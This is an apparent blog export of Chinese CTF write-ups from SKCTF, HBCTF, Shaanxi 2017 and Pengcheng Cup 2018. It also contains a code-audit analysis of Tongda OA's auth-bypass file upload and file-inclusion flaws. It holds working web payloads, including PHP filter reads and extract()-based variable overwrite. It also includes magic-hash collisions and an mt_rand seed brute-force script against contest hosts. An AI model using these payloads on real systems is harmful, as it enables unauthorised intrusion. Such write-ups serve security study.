<h3 id="3-Coding（300）"><a href="#3-Coding（300）" class="headerlink" title="3.Coding（300）"></a>3.Coding（300）</h3><p>.git泄露</p>
<p><strong>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</strong></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/173934854.png" alt="mark"></p>
<p>关键代码</p>
<pre><code>&lt;?php
error_reporting(0);
include &quot;flag.php&quot;;

$admin_user = &quot;pr0_adm1n&quot;;
$admin_pw = clean_hash(&quot;0e408306536730731920197920342119&quot;);

function clean_hash($hash) &#123;
    return preg_replace(&quot;/[^0-9a-f]/&quot;,&quot;&quot;,$hash);
&#125;

function myhash($str) &#123;
    return clean_hash(md5(md5($str) . &quot;SALT&quot;));
&#125;

function create_password($pw_length =  10)
&#123;
$randpwd = &quot;&quot;;
for ($i = 0; $i &lt; $pw_length; $i++)
&#123;
$randpwd .= chr(mt_rand(33, 126));
&#125;
return $randpwd;
&#125;

?&gt;</code></pre>
<p>写脚本（注意时间）</p>
<pre><code>&lt;?php
$user=&quot;pr0_adm1n&quot;;
for($i=0; $i&lt;1000000000; $i++) &#123;
    $str = $i;
    hash = md5(md5($str) . &quot;SALT&quot;);
    echo $hash.&quot;\n&quot;;
    if(preg_match(&quot;/^0e[0-9]+$/&quot;, $hash)) &#123;
        echo $str.&quot; : &quot;.$hash.&quot;\n&quot;;
        break;
&#125;
            //62778807 : 0e774261293712168181959463563504
&#125;
$password=$str;
function create_password($pw_length = 10)
&#123;
$randpwd = &quot;&quot;;
for ($i = 0; $i &lt; $pw_length; $i++)
&#123;
$randpwd .= chr(mt_rand(33, 126));
&#125;
return $randpwd;
&#125;
function send_post($url, $post_data) &#123;
 $postdata = http_build_query($post_data);
    $options = array(
        &#39;http&#39; =&gt; array(
        &#39;method&#39; =&gt; &#39;POST&#39;,
        &#39;header&#39; =&gt; &#39;Content-type:application/x-www-form-urlencoded&#39;,
        &#39;content&#39; =&gt; $postdata,
        &#39;timeout&#39; =&gt; 15 * 60 // 超时时间（单位 :s ）
)
);
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context).&quot;\n&quot;;
return $result;
&#125;
for($j=time()-20;$j&lt;time()+20;$j++)
&#123;
    mt_srand($j);
    $pwd=create_password();
    echo &quot;pwd &quot;.$pwd.&quot;\n&quot;;
    echo &quot;user &quot; .$user.&quot;\n&quot;;
    echo &quot;password &quot;.$password.&quot;\n&quot;;
    $post_data = array(
        &#39;user&#39; =&gt; $user,
        &#39;password&#39; =&gt; $password,
        &#39;pwd&#39;=&gt;$pwd
);
$content=send_post(&#39;http://192.168.64.133/ctf/baopo/&#39;,$post_data);
if(strpos($content,&#39;SKCTF&#39;)&gt;-1)
&#123;
echo $content;
&#125;
&#125;</code></pre>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="1-zip-（100）"><a href="#1-zip-（100）" class="headerlink" title="1.zip??（100）"></a>1.zip??（100）</h4><p>zip伪加密。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/175454876.png" alt="mark"></p>
<h4 id="2-base的n次方（150）"><a href="#2-base的n次方（150）" class="headerlink" title="2.base的n次方（150）"></a>2.base的n次方（150）</h4><p>题目给出加密代码：</p>
<pre><code>a = &quot;flag&#123;&#125;&quot;
for i in range (1,30):
    b = random.randint(1 , 3)
    if b ==1:
        a= base64.b16encode(a)
    elif b==2:
        a= base64.b64encode(a)
    else:
        a= base64.b32encode(a)
s= open(&quot;flagencode.txt&quot;,&quot;w&quot;)
s.write(a)
print &quot;done!!!&quot;</code></pre>
<p>flagencode.txt</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/175732558.png" alt="mark"></p>
<p>写脚本(py2)：</p>
<pre><code>import base64
b64 = &quot;abcdefghijklmnopqrstuvwxyz&quot;
b32 = &quot;GHIJKLMOPQSTUVWXYZ&quot;
#s=open(&quot;flagencode.txt&quot;,&quot;r&quot;)
flag=open(&quot;flagencode.txt&quot;).read()
for i in range (1,30):
    base=0
    for c in b64:
        if(c in flag):
            base=int(64)
            break
    if (base==64):
        flag=base64.b64decode(flag)
        base=0
        continue
    for c in b32:
        if(c in flag):
            base=int(32)
            break
    if (base==32):
        flag=base64.b32decode(flag)
        base=0
        continue
    flag=base64.b16decode(flag)
print(flag)</code></pre>
<h4 id="3-shark"><a href="#3-shark" class="headerlink" title="3.shark"></a>3.shark</h4><p>下载一个流量包，shark打开。</p>
<p>追踪HTTP流看到flag.zip的get请求，导出来是加密的flag.txt,密码在HTTP头中，base64解密就是压缩包的密码。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/182311430.png" alt="mark"></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="1-多试几次（100）"><a href="#1-多试几次（100）" class="headerlink" title="1.多试几次（100）"></a>1.多试几次（100）</h4><p>拖进IDA.</p>
<p>进字符S看看发现，S的值为设定好了的为SDUST，进ggg函数看，是把s的每一个字符和0x20异或赋给s1，和a比较，输出s1.</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>解决zip伪加密的另一方法-爆破</title>
    <url>/2017/04/15/jie-jue-zip-wei-jia-mi-de-ling-yi-fang-fa-bao-po/</url>
    <content><![CDATA[<p>hbctf的一个题–&gt;<a href="http://hbctf-1252906577.costj.myqcloud.com/misc/flag6.zip">http://hbctf-1252906577.costj.myqcloud.com/misc/flag6.zip</a></p>
<p>先来writeup：</p>
<p>解压软件打开，可以看到CRC32值。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/012239450.png" alt="mark"></p>
<p>因为题目提示了是6位数字，匹配CRC32爆破。</p>
<pre><code>import binascii
real = 0x9c4d9a5d
for y in range(100000, 999999):
    if real == (binascii.crc32(str(y)) &amp; 0xffffffff):
        print(y)</code></pre>
<blockquote>
<p><a href="http://baike.baidu.com/link?url=4mgWp8jfdKNnX6rP8n-aHHenk1bgeVhyrnNacwU8HBjJav3YoJX9UKMwgl2ridbDF8uyfyxoGSGvQm0Co4FnMq">CRC</a>的全称是<a href="http://baike.baidu.com/item/%E5%BE%AA%E7%8E%AF%E5%86%97%E4%BD%99%E6%A0%A1%E9%AA%8C">循环冗余校验</a>。</p>
<p>CRC32:CRC本身是“冗余校验码”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。</p>
<p>binascii：二进制和ASCII互转以及其他进制转换</p>
</blockquote>
<p>​    由于CRC32产生校验值时源数据块的每一个bit（位）都参与了计算，所以数据块中即使只有一位发生了变化，也会得到不同的CRC32值.再加上题目提示了6位数字，这就大大缩小了范围，不同的数的CRC32值是不同的，所以可以通过循环匹配来爆破出文件值，即flag。</p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>加解密</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA任意文件上传&amp;文件包含</title>
    <url>/2020/03/31/tong-da-oa-ren-yi-wen-jian-shang-chuan-wen-jian-bao-han/</url>
    <content><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>最近爆出了通达OA的两枚漏洞，文件上传漏洞为全版本通杀，文件包含漏洞只有V11.3版本存在。</p>
<p>通过绕过身份认证, 攻击者可上传任意文件，配合文件包含即可出发远程恶意代码执行。</p>
<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p><a href="https://pan.baidu.com/s/1U8rCzFLJjv2o_7nJNlGCoA">通达OA V11.3</a>  密码:ordv</p>
<p>源码使用zend5.4加密，使用SeayDzend解密工具解密。</p>
<p>由于源码文件太多，可以只解密造成漏洞的关键文件。</p>
<pre><code>/ispirit/im/upload.php
inc/utility_file.php
ispirit/interface/gateway.php</code></pre>
<p>这里分析一下全部解密后的源码：<a href="https://pan.baidu.com/s/1lKvhUVhEYSyIPIRNKHSy4Q">链接</a>提取码：p9av</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1、文件包含"><a href="#1、文件包含" class="headerlink" title="1、文件包含"></a>1、文件包含</h3><p>问题代码在<code>gateway.php</code>文件中，有一处文件包含，满足条件就会包含url。</p>
<pre><code class="php">if ($P != &quot;&quot;) &#123;
    if (preg_match(&quot;/[^a-z0-9;]+/i&quot;, $P)) &#123;
        echo _(&quot;非法参数&quot;);
        exit();
    &#125;

    session_id($P);
    session_start();
    session_write_close();
    if (($_SESSION[&quot;LOGIN_USER_ID&quot;] == &quot;&quot;) || ($_SESSION[&quot;LOGIN_UID&quot;] == &quot;&quot;)) &#123;
        echo _(&quot;RELOGIN&quot;);
        exit();
    &#125;
&#125;
if ($json) &#123;
    $json = stripcslashes($json);
    $json = (array) json_decode($json);

    foreach ($json as $key =&gt; $val ) &#123;
        ......
        &#125;

        if ($key == &quot;url&quot;) &#123;
            $url = $val;
        &#125;
    &#125;

    if ($url != &quot;&quot;) &#123;
        if (substr($url, 0, 1) == &quot;/&quot;) &#123;
            $url = substr($url, 1);
        &#125;

        if ((strpos($url, &quot;general/&quot;) !== false) || (strpos($url, &quot;ispirit/&quot;) !== false) || (strpos($url, &quot;module/&quot;) !== false)) &#123;
            include_once $url;
        &#125;
    &#125;

    exit();
&#125;</code></pre>
<p>先是对<code>$P</code>进行了是否为空、正则校验以及当前用户是否登录。</p>
<p><code>$json</code>参数接受一个json格式的值，然后转化为数组。所以只要在传入的json数据中使url参数中包含<code>ispirit/</code>、<code>general/</code>、<code>module/</code>就可以通过跨目录进行包含。</p>
<p>payload：<code>payload：json=&#123;&quot;url&quot;:&quot;xxx&quot;&#125;</code></p>
<h3 id="2、文件上传"><a href="#2、文件上传" class="headerlink" title="2、文件上传"></a>2、文件上传</h3><p>文件上传的入口在<code>/ispirit/im/upload.php</code>：</p>
<pre><code class="php">set_time_limit(0);
$P = $_POST[&quot;P&quot;];
if (isset($P) || ($P != &quot;&quot;)) &#123;
    ob_start();
    include_once &quot;inc/session.php&quot;;
    session_id($P);
    session_start();
    session_write_close();
&#125;
else &#123;
    include_once &quot;./auth.php&quot;;
&#125;</code></pre>
<p>先检查有没有POST参数P，P存在而且内容不为空则获取session，否则进行身份认证。</p>
<p>第20行开始又有两个POST传递的参数：</p>
<pre><code class="php">$TYPE = $_POST[&quot;TYPE&quot;];
$DEST_UID = $_POST[&quot;DEST_UID&quot;];
$dataBack = array();
if (($DEST_UID != &quot;&quot;) &amp;&amp; !td_verify_ids($ids)) &#123;
    $dataBack = array(&quot;status&quot; =&gt; 0, &quot;content&quot; =&gt; &quot;-ERR &quot; . _(&quot;接收方ID无效&quot;));
    echo json_encode(data2utf8($dataBack));
    exit();
&#125;

if (strpos($DEST_UID, &quot;,&quot;) !== false) &#123;
&#125;
else &#123;
    $DEST_UID = intval($DEST_UID);
&#125;
if ($DEST_UID == 0) &#123;
    if ($UPLOAD_MODE != 2) &#123;
        $dataBack = array(&quot;status&quot; =&gt; 0, &quot;content&quot; =&gt; &quot;-ERR &quot; . _(&quot;接收方ID无效&quot;));
        echo json_encode(data2utf8($dataBack));
        exit();
    &#125;
&#125;</code></pre>
<p><code>$TYPE</code>和<code>$DEST_UID</code>都是通过POST的方式传递进来的，然后要求<code>$DEST_UID</code>不为空，同时如果<code>$DEST_UID</code>为0的话<code>$UPLOAD_MODE</code>要是2。</p>
<p>然后继续进入文件上传的部分：</p>
<pre><code class="php">$MODULE = &quot;im&quot;;

if (1 &lt;= count($_FILES)) &#123;
    if ($UPLOAD_MODE == &quot;1&quot;) &#123;
        if (strlen(urldecode($_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;])) != strlen($_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;])) &#123;
            $_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;] = urldecode($_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;]);
        &#125;
    &#125;

    $ATTACHMENTS = upload(&quot;ATTACHMENT&quot;, $MODULE, false);</code></pre>
<p>如果有文件上传进入upload函数，否则报错无文件上传。从上面代码知道文件上传的变量名为<code>ATTACHMENT</code>，如果<code>$UPLOAD_MODE</code>为1，会处理一下name参数的编码问题。然后跟进upload函数，进入<code>inc/utility_file.php</code>文件，第1665行。</p>
<p>该函数经过一系列参数检查，文件检查等检查后返回一个数组<code>ATTACHMENTS</code>。</p>
<pre><code class="php">#1691
            if (!is_uploadable($ATTACH_NAME)) &#123;
                $ERROR_DESC = sprintf(_(&quot;禁止上传后缀名为[%s]的文件&quot;), substr($ATTACH_NAME, strrpos($ATTACH_NAME, &quot;.&quot;) + 1));
            &#125;
#1705
            if (preg_match(&quot;/[\&#39;:&lt;&gt;?]|\/|\\\\|\&quot;|\|/u&quot;, $ATTACH_NAME_UTF8)) &#123;
                $ERROR_DESC = sprintf(_(&quot;文件名[%s]包含[/\&#39;\&quot;:*?&lt;&gt;|]等非法字符&quot;), $ATTACH_NAME);
            &#125;</code></pre>
<p>这里调用<code>is_uploadable</code>函数进行上传检查。</p>
<pre><code class="php">function is_uploadable($FILE_NAME)
&#123;
    $POS = strrpos($FILE_NAME, &quot;.&quot;);

    if ($POS === false) &#123;
        $EXT_NAME = $FILE_NAME;
    &#125;
    else &#123;
        if (strtolower(substr($FILE_NAME, $POS + 1, 3)) == &quot;php&quot;) &#123;
            return false;
        &#125;

        $EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));
    &#125;

    if (find_id(MYOA_UPLOAD_FORBIDDEN_TYPE, $EXT_NAME)) &#123;
        return false;
    &#125;</code></pre>
<p>函数中寻找最后一个<code> .</code> 的位置后三个字符，小写后看是否匹配字符’php’，匹配则返回<code>false</code>，还通过<code>find_id</code>函数进行黑名单的检查。</p>
<p>然后看一下保存路径问题，<code>$UPLOAD_MODE</code>所需要的<code>$ATTACHMENT_ID</code>等参数来自于<code>$ATTACHMENTS</code>,而<code>$ATTACHMENTS</code>则是调用upload函数的返回结果:upload.php</p>
<pre><code class="php">#61    
  $ATTACHMENT_ID = substr($ATTACHMENTS[&quot;ID&quot;], 0, -1);
    $ATTACHMENT_NAME = substr($ATTACHMENTS[&quot;NAME&quot;], 0, -1);
#82
if ($UPLOAD_MODE == &quot;1&quot;) &#123;
    if (is_thumbable($ATTACHMENT_NAME)) &#123;
        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);
        $THUMB_FILE_PATH = substr($FILE_PATH, 0, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . &quot;thumb_&quot; . $ATTACHMENT_NAME;
        CreateThumb($FILE_PATH, 320, 240, $THUMB_FILE_PATH);
    &#125;</code></pre>
<p>inc/utility_file.php文件1713行</p>
<pre><code class="php">            if ($ERROR_DESC == &quot;&quot;) &#123;
                $ATTACH_NAME = str_replace(&quot;&#39;&quot;, &quot;&quot;, $ATTACH_NAME);
                $ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);

                if ($ATTACH_ID === false) &#123;
                    $ERROR_DESC = sprintf(_(&quot;文件[%s]上传失败&quot;), $ATTACH_NAME);
                &#125;
                else &#123;
                    $ATTACHMENTS[&quot;ID&quot;] .= $ATTACH_ID . &quot;,&quot;;
                    $ATTACHMENTS[&quot;NAME&quot;] .= $ATTACH_NAME . &quot;*&quot;;
                &#125;
            &#125;</code></pre>
<p><code>ATTACHMENTS[&quot;ID&quot;]</code>来源于add_attach函数，位于inc/utility_file.php文件1854行</p>
<pre><code class="php">    $PATH = $ATTACH_PATH_ACTIVE . $MODULE;
    if (!file_exists($PATH) || !is_dir($PATH)) &#123;
        @mkdir($PATH, 448);
    &#125;

    $PATH = $PATH . &quot;/&quot; . $YM;
    if (!file_exists($PATH) || !is_dir($PATH)) &#123;
        @mkdir($PATH, 448);
    &#125;

$FILENAME = $PATH . &quot;/&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;

    if (file_exists($FILENAME)) &#123;
        $ATTACH_ID = mt_rand();
        $FILENAME = $PATH . &quot;/&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;
    &#125;</code></pre>
<p>有<code>$PATH</code>和<code>$FILENAME</code>，然后看返回的内容</p>
<pre><code class="php">    $ATTACH_ID_NEW = $AID . &quot;@&quot; . $YM . &quot;_&quot; . $ATTACH_ID;
    if (is_office($ATTACH_NAME) &amp;&amp; ($ATTACH_SIGN != 0)) &#123;
        $ATTACH_ID_NEW .= &quot;.&quot; . $ATTACH_SIGN;
    &#125;

    return $ATTACH_ID_NEW;</code></pre>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>陕西省网络空间安全技术大赛WriteUp</title>
    <url>/2017/04/15/shan-xi-sheng-wang-luo-kong-jian-an-quan-ji-zhu-da-sai-writeup/</url>
    <content><![CDATA[<h1 id="陕西省网络空间安全技术大赛WriteUp"><a href="#陕西省网络空间安全技术大赛WriteUp" class="headerlink" title="陕西省网络空间安全技术大赛WriteUp"></a>陕西省网络空间安全技术大赛WriteUp</h1><p>1.签到（10分）</p>
<p>base64解密</p>
<p>2.<a href="http://117.34.111.15:84/">签到</a>（50分）</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/162802942.png" alt="mark"></p>
<p>看一下源码~</p>
<pre><code>
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;登录&lt;/title&gt;
    &lt;meta name=&quot;description&quot; content=&quot;slick Login&quot;&gt;
    &lt;meta name=&quot;author&quot; content=&quot;Webdesigntuts+&quot;&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;form&gt;
    &lt;div align=&quot;center&quot;&gt;
    &lt;p&gt;Username: &lt;input type=&quot;text&quot; name=&quot;Username&quot; id=&quot;Username&quot; size=&quot;25&quot; required/&gt;&lt;/p&gt;
    &lt;p&gt;Password: &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; size=&quot;25&quot; required/&gt;&lt;/p&gt;
    &lt;p&gt;&lt;input type=&quot;submit&quot; class=&quot;small button&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;Submit&quot;/&gt;&lt;br/&gt;&lt;/p&gt;
    &lt;/form&gt;

     &lt;!--  if (isset($_GET[&#39;Username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])) &#123;
           $logined = true;
        $Username = $_GET[&#39;Username&#39;];
        $password = $_GET[&#39;password&#39;];

        if (!ctype_alpha($Username)) &#123;$logined = false;&#125;
        if (!is_numeric($password) ) &#123;$logined = false;&#125;
        if (md5($Username) != md5($password)) &#123;$logined = false;&#125;

        if ($logined)&#123;
            echo &quot;successful&quot;;
        &#125; else &#123;
            echo &quot;login failed!&quot;;
        &#125;
    &#125;
--&gt;
&lt;/body&gt;

&lt;/html&gt;

</code></pre>
<p>可以看出来这里的要求是：</p>
<p>（1）username是字母</p>
<p>（2）password是数字</p>
<p>（3）2者的md5的==判断为true</p>
<p>这里的关键在于松散比较，如果<code>0e</code> 开头的，又是用的 <code>==</code> ，可以只判断前两位，之后的只要都是数字就可以。</p>
<p>纯数字md5：240610708 </p>
<p>纯字母md5：QNKCDZO</p>
<p>可以写脚本跑，最好平时跑好收集起来。</p>
<pre><code>&lt;?php
for ($flag = 240000000; $flag &lt;= 249999999; $flag++) &#123;
        if (md5($flag) == md5(&#39;QNKCDZO&#39;))&#123;
            echo $flag.&quot;/&quot;;
        &#125;
&#125;

?&gt;</code></pre>
<p>submit,然后。。。。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/164801541.png" alt="mark"></p>
<p>源码源码~</p>
<pre><code>
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;qiang&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;form&gt;
    &lt;div align=&quot;center&quot;&gt;
    &lt;h2&gt;哈哈，以为这样就完了吗？！并没有，接着奋斗吧，少年！&lt;/h2&gt;
    &lt;/form&gt;

     &lt;!--  if (isset($_POST[&#39;message&#39;])) &#123;
    $message = json_decode($_POST[&#39;message&#39;]);
    $key =&quot;*********&quot;;
    if ($message-&gt;key == $key) &#123;
        echo &quot;flag&quot;;
    &#125; 
    else &#123;
        echo &quot;fail&quot;;
    &#125;
 &#125;
 else&#123;
     echo &quot;~~~~&quot;;
 &#125;
--&gt;
&lt;/body&gt;

&lt;/html&gt;
​~~~~</code></pre>
<p>百度了解一些<a href="http://www.jb51.net/article/30489.htm">json_decode</a>,构造post。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/165051531.png" alt="mark"></p>
<p>原理呢如下</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/165118693.png" alt="mark"></p>
<p>得到flag：flag{sffs_gsg_suhs}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>鹏城杯2018Writeup</title>
    <url>/2018/12/02/peng-cheng-bei-2018writeup/</url>
    <content><![CDATA[<blockquote>
<p>Web狗没有活路啦 (╯°Д°)╯︵ ┻━┻</p>
</blockquote>
<a id="more"></a>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="myblog"><a href="#myblog" class="headerlink" title="myblog"></a>myblog</h3><p>index.php的header中有<code>flag: JTNGZmxhZw==</code>，解base64得到参数<code>%3Fflag</code>，猜测index.php存在文件包含，运用flag参数读文件。</p>
<p>payload:<code>PD9waHAgDQoJaGVhZGVyKCdmbGFnOiBKVE5HWm14aFp3PT0nKTsNCglpZihpc3NldCgkX0dFVFsiZmxhZyJdKSl7DQoJCSRmbGFnID0gJF9HRVRbImZsYWciXTsNCgkJaW5jbHVkZSAkZmxhZy4iLnBocCI7DQoJfQ0KPz4=</code></p>
<pre><code class="php">&lt;?php
    header(&#39;flag: JTNGZmxhZw==&#39;);
    if(isset($_GET[&quot;flag&quot;]))&#123;
        $flag = $_GET[&quot;flag&quot;];
        include $flag.&quot;.php&quot;;
    &#125;
?&gt;</code></pre>
<p>提示aboutyou后端，about里也提到了base64，猜测存在<code>YWJvdXQ=.php</code></p>
<p>payload:<code>http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=YWJvdXQ=</code></p>
<pre><code class="php">&lt;?php

    $filename = &#39;flag.txt&#39;;
    $flag = &#39;flag.txt&#39;;
    extract($_GET);

    if(isset($sign))&#123;
        $file = trim(file_get_contents($filename));
        if($sign === $file)&#123;
            echo &#39;Congratulation!&lt;br&gt;&#39;;
            echo file_get_contents($$falg);
        &#125;
        else&#123;
            echo &#39;don`t give up&#39;;
        &#125;
    &#125;

?&gt;</code></pre>
<p>变量覆盖+伪协议，让<code>$sign=a</code>，<code>$file</code>为post输入，让$falg为flag读取文件。</p>
<p>payload:<code>http://58.20.46.150:26293/YWJvdXQ=.php?sign=a&amp;filename=php://input&amp;falg=flag</code>(post:a)</p>
<p><img src="/images/pcb2018/myblog.png"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easyCrypto"><a href="#easyCrypto" class="headerlink" title="easyCrypto"></a>easyCrypto</h3><p>在搜索过程中找到了这篇文章：<a href="https://xz.aliyun.com/t/2830">https://xz.aliyun.com/t/2830</a></p>
<p>他的题目的脚本中和本题的加密算法差不多，拿他题目的解密算法改了一下。</p>
<p>脚本如下（直接改的题目脚本）：</p>
<pre><code class="python">#!usr/bin/python 
#_*_ coding=UTF-8 _*_

from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
from Crypto import Random
import sys
#from FLAG import flag

class aesdemo:
    #aes = AES.new(key,mode)
    def __init__(self,key):
        self.key = key
        #self.BS=BS


    def pad(self,msg):
        #BS = AES.block_size 
        # aes数据分组长度为128 bit
        byte = 16 - len(msg) % 16
        return msg + chr(byte) * byte
    def unpad(self,msg):
        if not msg:
            return &#39;&#39;
        return msg[:-ord(msg[-1])]        

    def xor(self,a, b):
            #assert len(a) == len(b)
            return &#39;&#39;.join([chr(ord(ai)^ord(bi)) for ai, bi in zip(a,b)])

    def split_by(self,data,step):
            return [data[i : i+step] for i in xrange(0, len(data), step)]


    def tsb_decrypt(self, msg):
        iv, msg = msg[:16], msg[16:]
        a = b2a_hex(iv)
        prev_pt = iv
        prev_ct = iv
        pt = &#39;&#39;
        aes = AES.new(self.key,AES.MODE_CBC,iv)
        for block in self.split_by(msg, 16):
            pt_block = self.xor(block, prev_ct)
            pt_block = aes.decrypt(pt_block)
            pt_block = self.xor(pt_block, prev_pt)
            pt += pt_block

        print pt
        print self.unpad(pt)

# 测试模块
if __name__ == &#39;__main__&#39;:
    BS = AES.block_size # aes数据分组长度为128 bit
    key=&quot;asdfghjkl1234567890qwertyuiopzxc&quot;
    enc = &#39;524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa&#39;
    demo = aesdemo(key)
    #e = demo.encrypt(flag)
    #print(&quot;加密：&quot;, e)

    demo.tsb_decrypt(a2b_hex(enc))
    #print f


</code></pre>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Traffic-Light"><a href="#Traffic-Light" class="headerlink" title="Traffic Light"></a>Traffic Light</h3><p>两种颜色的灯，每8个会出现没眼色的来分割。猜测表示二进制数据。</p>
<p>脚本将二色灯转换为1和0。</p>
<p>脚本：</p>
<pre><code class="python">from PIL import Image, ImageSequence

image = Image.open(&#39;Traffic_Light.gif&#39;)
iter = ImageSequence.Iterator(image)

flag = &#39;&#39;
tmp = &#39;&#39;


for i in range(0,1168,2):
  img = iter[i].convert(&#39;RGB&#39;)
  light1 = img.getpixel((112, 50))
  light2 = img.getpixel((112, 150))
  if str(light2) == &#39;(0, 255, 0)&#39;:
    tmp += &#39;0&#39;
  if str(light1) == &#39;(255, 0, 0)&#39;:
    tmp += &#39;1&#39;
  if len(tmp) == 8:
    #print tmp
    flag += chr(int(tmp, 2))
    tmp = &#39;&#39;

print(flag)
</code></pre>
<h3 id="Quotes"><a href="#Quotes" class="headerlink" title="Quotes"></a>Quotes</h3><blockquote>
<p>My+mission+in+life+is+not+mer ely+to+survive+but to+thrive+and+to+do+so+w ith+s  ome+pass i on+some+compass ion+so me+humor+and+some+style</p>
</blockquote>
<p>分组了，而且每组不算+的长度不超过26，猜测对应26个字母，奈何刚开始写脚本多写了个+1，痛失二血。</p>
<p>脚本：</p>
<pre><code class="python">pos = &#39;23 15 18 4 7 1 13 5 19&#39;.split(&#39; &#39;)

flag = &#39;&#39;

for i in pos:
    flag += chr(int(i)+96)

print flag
</code></pre>
<p>提交的falg为：flag{word games}</p>
<h3 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s_this"></a>What’s_this</h3><p>挺麻烦的个题= =</p>
<p>题目文件是个图片，binwalk提取得到<code>1-stage.docx 2-stage.what 7A160.zip    EE548.zip    zip2.zip</code></p>
<p>1-stage.docx有隐藏文字，拿出来和 zip2.zip进行明文攻击，得到密码<code>Hello_Hi</code>。</p>
<p><img src="/images/pcb2018/whatis.png"></p>
<p>解压得到<code>2-stage         flowerdance.txt</code></p>
<p>根据提示用cloacked-pixel提取出隐藏的文件，是个zip。</p>
<p>解压zip得到zip3和zip4，都是加密文件</p>
<p>zip3的文件只有4B，采用CRC爆破得到内容<code>girl</code></p>
<p>脚本：</p>
<pre><code class="python">import binascii
import base64
import string
import itertools
import struct

alph = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&#39;

crcdict = &#123;&#125;
print &quot;computing all possible CRCs...&quot;
for x in itertools.product(list(alph), repeat=4):
    st = &#39;&#39;.join(x)
    testcrc = binascii.crc32(st)
    crcdict[struct.pack(&#39;&lt;i&#39;, testcrc)] = st
print &quot;Done!&quot;

f = open(&#39;zip3.zip&#39;)
data = f.read()
f.close()
crc = &#39;&#39;.join(data[14:18])
if crc in crcdict:
    print crcdict[crc]
else:
    print &quot;FAILED!&quot;</code></pre>
<p>用girl解压zip4得到了fake_flag和<code>what&#39;s next.txt</code></p>
<p>因为<code>what&#39;s next.txt</code>和<code>zip4</code>的数据长度一样，进行异或后得到新的zip解压得到flag。</p>
<pre><code class="python">file1 = open(&#39;I_Love_You.emf&#39;,&#39;rb&#39;)
#file2 = open(&quot;what&#39;s next.txt&quot;,&#39;rb&#39;)
flag = open(&quot;flag&quot;,&#39;wb&#39;)
file3 = open(&#39;zip4.zip&#39;, &#39;rb&#39;)
f1 = file1.read()
#f2 = file2.read()
f3 = file3.read()
print len(f1),len(f3)
out = &#39;&#39;
for i in range(len(f3)):
    out += chr(ord(f1[i])^ord(f3[i]))

with open(&#39;flag.zip&#39;, &#39;w&#39;) as f:
    f.write(out)</code></pre>
<h3 id="GreatWall"><a href="#GreatWall" class="headerlink" title="GreatWall"></a>GreatWall</h3><p>Strgosolve提取转存二进制数据.</p>
<p><img src="/images/pcb2018/greatwall1.png"></p>
<p>用foremost提取出的图片,放大图片发现最上面有莫斯电码</p>
